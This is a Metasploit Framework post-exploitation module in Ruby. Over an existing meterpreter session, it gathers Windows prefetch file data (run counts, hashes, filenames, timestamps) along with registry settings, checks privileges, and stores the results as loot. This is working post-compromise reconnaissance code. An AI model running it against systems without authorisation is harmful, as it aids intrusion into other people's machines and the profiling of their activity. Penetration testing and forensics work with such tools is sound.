##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          =>      'Windows Gather Prefetch File Information',
                      'Description'   =>       %q{This module gathers prefetch file information from WinXP, Win2k3 and Win7 systems.
																									File offset reads for run count, hash and filename are collected from each prefetch file
																									using WinAPI through Railgun while Last Modified and Create times are file MACE values.},
                      'License'       =>      MSF_LICENSE,
                      'Author'        =>      ['TJ Glad <fraktaali[at]gmail.com>'],
                      'Platform'      =>      ['win'],
                      'SessionType'   =>      ['meterpreter']
                     ))
  end


  def prefetch_key_value()
    # Checks if Prefetch registry key exists and what value it has.
    prefetch_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session\ Manager\\Memory\ Management\\PrefetchParameters", KEY_READ)
    key_value = prefetch_key.query_value("EnablePrefetcher").data

    if key_value == 0
      print_error("EnablePrefetcher Value: (0) = Disabled (Non-Default).")
    elsif key_value == 1
      print_good("EnablePrefetcher Value: (1) = Application launch prefetching enabled (Non-Default).")
    elsif key_value == 2
      print_good("EnablePrefetcher Value: (2) = Boot prefetching enabled (Non-Default, excl. Win2k3).")
    elsif key_value == 3
      print_good("EnablePrefetcher Value: (3) = Applaunch and boot enabled (Default Value, excl. Win2k3).")
    else
      print_error("No value or unknown value. Results might vary.")
    end
      prefetch_key.close
  end

  def timezone_key_values(key_value)
      # Looks for timezone from registry
      timezone_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", KEY_READ)
      if timezone_key.nil?
        print_line("Couldn't find key/value for timezone from registry.")
      else
        timezone = timezone_key.query_value(key_value).data
        tzbias = timezone_key.query_value("Bias").data
        if timezone.nil? or tzbias.nil?
          print_error("Couldn't find timezone information from registry.")
        else
          print_good("Remote: Timezone is %s." % timezone)
          if tzbias < 0xfff
            bias = tzbias
            print_good("Remote: Localtime bias to UTC: -%s minutes." % bias)
          else
            offset = 0xffffffff
            bias = offset - tzbias
            print_good("Remote: Localtime bias to UTC: +%s minutes." % bias)
          end
        end
      end
      timezone_key.close
  end


  def gather_prefetch_info(name_offset, hash_offset, lastrun_offset, runcount_offset, filename, table)

    # This function seeks and gathers information from specific offsets.
    h = client.railgun.kernel32.CreateFileA(filename, "GENERIC_READ", "FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING", "FILE_ATTRIBUTE_READONLY", nil)

    if h['GetLastError'] != 0
      print_error("Error opening a file handle on %s." % filename)
    else
      handle = h['return']

      # Finds the filename from the prefetch file
      client.railgun.kernel32.SetFilePointer(handle, name_offset, 0, nil)
      fname = client.railgun.kernel32.ReadFile(handle, 60, 60, 4, nil)
      name = fname['lpBuffer']
      idx = name.index("\x00\x00")

      # Finds the run count from the prefetch file
      client.railgun.kernel32.SetFilePointer(handle, runcount_offset, 0, nil)
      count = client.railgun.kernel32.ReadFile(handle, 4, 4, 4, nil)

      # Finds the file path hash from the prefetch file.
      client.railgun.kernel32.SetFilePointer(handle, hash_offset, 0, nil)
      hash = client.railgun.kernel32.ReadFile(handle, 4, 4, 4, nil)

      # Finds the LastModified/Created timestamp (MACE)
      mtimes = client.priv.fs.get_file_mace(filename)

      # Checking and moving the values
      if idx.nil? or count.nil? or hash.nil? or mtimes.nil?
        print_error("Error reading file (might be temporary): %s" % filename)
      else
        pname = Rex::Text.to_ascii(name.slice(0..idx))
        prun = count['lpBuffer'].unpack('L*')[0]
        phash = hash['lpBuffer'].unpack('h*')[0].reverse
        lmod = mtimes['Modified'].utc
        creat = mtimes['Created'].utc
        table << [lmod, creat,prun,phash,pname]
      end
      client.railgun.kernel32.CloseHandle(handle)
    end
  end


  def run

    print_status("Prefetch Gathering started.")

    # Check to see what Windows Version is running.
    # Needed for offsets.
    # Tested on WinXP, Win2k3 and Win7 systems.
    # http://www.forensicswiki.org/wiki/Prefetch
    # http://www.forensicswiki.org/wiki/Windows_Prefetch_File_Format

		sysnfo = client.sys.config.sysinfo['OS']
		error_msg = "You don't have enough privileges. Try getsystem."

    if sysnfo =~/(Windows XP|2003|.NET)/
      if not is_system?
        print_error(error_msg)
        return nil
      end
      # Offsets for WinXP & Win2k3
      print_good("Detected #{sysnfo} (max 128 entries)")
      name_offset = 0x10
      hash_offset = 0x4C
      lastrun_offset = 0x78
      runcount_offset = 0x90
      # Registry key for timezone
      key_value = "StandardName"

    elsif sysnfo =~/(Windows 7)/
      if not is_admin?
        print_error(error_msg)
        return nil
      end
      # Offsets for Win7
      print_good("Detected #{sysnfo} (max 128 entries)")
      name_offset = 0x10
      hash_offset = 0x4C
      lastrun_offset = 0x80
      runcount_offset = 0x98
      # Registry key for timezone
      key_value = "TimeZoneKeyName"

    else
      print_error("No offsets for the target Windows version. Currently works only on WinXP, Win2k3 and Win7.")
      return nil
    end

    table = Rex::Ui::Text::Table.new(
      'Header'  => "Prefetch Information",
      'Indent'  => 1,
      'Columns' =>
      [
        "Modified (mace)",
        "Created (mace)",
        "Run Count",
        "Hash",
        "Filename"
      ])

    prefetch_key_value

    timezone_key_values(key_value)

    print_good("Current UTC Time: %s" % Time.now.utc)

    sysroot = client.fs.file.expand_path("%SYSTEMROOT%")
    full_path = sysroot + "\\Prefetch\\"
    file_type = "*.pf"
    print_status("Gathering information from remote system. This will take awhile..")

    # Goes through the files in Prefetch directory, creates file paths for the
    # gather_prefetch_info function that enumerates all the pf info

    getfile_prefetch_filenames = client.fs.file.search(full_path,file_type,timeout=-1)
    if getfile_prefetch_filenames.empty? or getfile_prefetch_filenames.nil?
      print_error("Could not find/access any .pf files. Can't continue.")
      return nil
    else
      getfile_prefetch_filenames.each do |file|
        if file.empty? or file.nil?
          print_error("Could not open file: %s" % filename)
        else
          filename = File.join(file['path'], file['name'])
          gather_prefetch_info(name_offset, hash_offset, lastrun_offset, runcount_offset, filename, table)
        end
      end
    end

    # Stores and prints out results
    results = table.to_s
    loot = store_loot("prefetch_info", "text/plain", session, results, nil, "Prefetch Information")
    print_line("\n" + results + "\n")
    print_status("Finished gathering information from prefetch files.")
    print_status("Results stored in: #{loot}")

  end
end
